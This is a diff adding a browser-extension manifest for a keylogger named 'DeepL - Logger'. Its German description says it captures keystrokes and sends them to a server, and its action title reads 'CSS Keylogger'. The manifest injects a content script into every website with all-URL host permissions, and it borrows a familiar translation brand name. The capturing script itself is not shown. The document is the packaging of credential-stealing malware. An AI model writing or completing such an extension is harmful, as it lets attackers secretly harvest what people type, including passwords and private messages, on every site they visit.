@@ -1,0 +1,24 @@
+{
+  "name": "DeepL - Logger",
+  "version": "1.0.0",
+  "manifest_version": 3,
+  "description": "Erfasst Tastatureingaben mit JavaScript und sendet sie an den Server.",
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_title": "CSS Keylogger",
+    "default_icon": "icons/icon16.png"
+  },
+  "icons": {
+    "16": "icons/icon16.png"
+  },
+  "permissions": ["tabs", "activeTab"],
+  "host_permissions": ["<all_urls>"],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ]
+}
